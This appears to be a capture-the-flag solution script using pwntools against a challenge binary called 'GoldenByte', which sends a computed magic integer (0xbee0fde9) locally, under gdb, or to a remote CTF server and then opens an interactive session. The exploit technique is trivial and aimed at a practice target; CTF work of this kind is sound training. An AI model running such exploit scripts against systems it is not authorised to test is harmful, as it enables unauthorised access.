from pwn import *

filePath = './GoldenByte'

def start_process():
    if args.GDB:
        return gdb.debug(filePath, gdbscript='''
            b main
        ''')
    elif args.REMOTE:
        return remote("ctf.mf.grsu.by", 9074)
    else:
        return process(filePath)

p = start_process()

lucky_a = 0xfde9
lucky_b = 0xbee0

target_num = (lucky_b << 16) | lucky_a

payload = str(target_num).encode()

p.sendline(payload)

p.interactive()

